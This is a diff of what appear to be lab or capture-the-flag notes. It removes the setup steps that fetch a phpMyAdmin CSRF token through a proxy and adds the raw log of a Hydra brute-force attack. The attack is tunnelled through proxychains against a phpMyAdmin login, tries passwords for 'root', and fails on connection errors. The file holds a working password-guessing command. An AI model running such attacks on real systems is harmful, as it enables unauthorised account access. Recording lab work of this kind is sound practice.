@@ -970,8 +970,33 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-19 09:49:
 
 ---
 
-cd /usr/share/wordlists/seclists/Usernames
-P=http://192.168.199.189:3128
-T=$(curl -s -x $P http://127.0.0.1:8080/phpmyadmin/index.php|grep -oP 'value="\K[a-f0-9]{32}')
-echo $T
 proxychains4 hydra -L top-usernames-shortlist.txt -P ../Passwords/Most-Popular-Letter-Passes.txt -s 8080 127.0.0.1 http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=2&target=index.php&token=$T:C=/phpmyadmin/index.php:2=:F=CSRF" -t 4 -f -V
+216a2f757c755648564f4c6478424b54 216a2f757c755648564f4c6478424b54
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-19 09:57:25
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 809251 login tries (l:17/p:47603), ~202313 tries per task
+[DATA] attacking http-post-form://127.0.0.1:8080/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=2&target=index.php&token=216a2f757c755648564f4c6478424b54
+216a2f757c755648564f4c6478424b54:C=/phpmyadmin/index.php:2=:F=CSRF
+[proxychains] Strict chain ... 192.168.199.189:3128 [proxychains] Strict chain ... 192.168.199.189:3128 [proxychains] Strict chain ... 192.168.199.189:3128 [proxychains] Strict chain ... 192.168.199.189:3128 [ATTEMPT] target 127.0.0.1 - login "root" - pass ""spring" - 1 of 809251 [child 0] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "root" - pass "'buster+'" - 2 of 809251 [child 1] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "root" - pass "++++" - 3 of 809251 [child 2] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "root" - pass "+monday" - 4 of 809251 [child 3] (0/0)
+... 127.0.0.1:8080 ... 127.0.0.1:8080 ... 127.0.0.1:8080 ... 127.0.0.1:8080 <--socket error or timeout!
+<--socket error or timeout!
+<--socket error or timeout!
+<--socket error or timeout!
+[proxychains] Strict chain ... 192.168.199.189:3128 [proxychains] Strict chain ... 192.168.199.189:3128 [proxychains] Strict chain ... 192.168.199.189:3128 [proxychains] Strict chain ... 192.168.199.189:3128 ... 127.0.0.1:8080 ... 127.0.0.1:8080 ... 127.0.0.1:8080 ... 127.0.0.1:8080 <--socket error or timeout!
+[ERROR] Child with pid 8312 terminating, cannot connect
+<--socket error or timeout!
+[ERROR] Child with pid 8314 terminating, cannot connect
+<--socket error or timeout!
+<--socket error or timeout!
+[ERROR] Child with pid 8315 terminating, cannot connect
+[ERROR] Child with pid 8313 terminating, cannot connect
+[ERROR] all children were disabled due too many connection errors
+0 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-19 09:57:58
